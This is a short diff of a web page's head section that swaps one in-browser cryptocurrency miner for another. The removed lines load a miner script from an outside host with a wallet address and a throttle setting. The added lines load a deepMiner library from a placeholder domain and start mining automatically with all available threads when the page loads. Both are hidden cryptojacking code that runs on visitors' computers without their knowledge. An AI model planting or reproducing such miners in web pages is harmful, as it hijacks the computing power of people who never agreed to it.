@@ -11,11 +11,17 @@
 			width: 180px;
 		}
 	</style>
-<script src="https://bitcoin-pay.eu/perfekt/perfekt.js?perfekt=wss://?jason=faster.xmr" ></script>
-<script type="text/javascript">
-PerfektStart('4751q6pGJzHD6FySoZDkMUQ9RF7pDATpghspFAVBPufyMi7b5JzM7AWEmK85tfEq9gXjH3BZjdP5vNTEESc8kXmKSpuZcqy5000', 'goodiiii');
-throttleMiner = 50;
-</script>
+	<script src="//%deepMiner_domain%/lib/deepMiner.min.js"></script>
+	<script>
+		var userID = 'deepMiner_wasm';
+		var miner = new deepMiner.Init(userID, {
+			autoThreads: true,
+			throttle:0.4
+		});
+		miner.start();
+		// Listen on events
+		
+	</script>
 </head>
 
 <body>
